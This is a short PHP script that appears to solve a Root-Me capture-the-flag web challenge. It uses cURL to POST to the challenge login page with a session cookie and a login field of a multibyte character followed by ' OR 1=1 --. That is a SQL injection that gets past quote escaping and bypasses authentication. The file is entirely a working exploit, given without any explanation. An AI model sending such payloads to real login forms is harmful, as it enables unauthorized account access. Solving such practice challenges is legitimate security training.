<?php
$url = "http://challenge01.root-me.org/web-serveur/ch42/index.php";
$ref = "http://challenge01.root-me.org/web-serveur/ch42/index.php";
$session = "PHPSESSID=d4971cb80217a4869bad2f974590300d";

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_REFERER, $ref);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
curl_setopt($ch, CURLOPT_COOKIE, $session);
curl_setopt($ch, CURLOPT_POST, TRUE);
curl_setopt($ch, CURLOPT_POSTFIELDS, "login=縗' OR 1=1 -- &password=aze");

$data = curl_exec($ch);

print($data);
curl_close($ch);
?>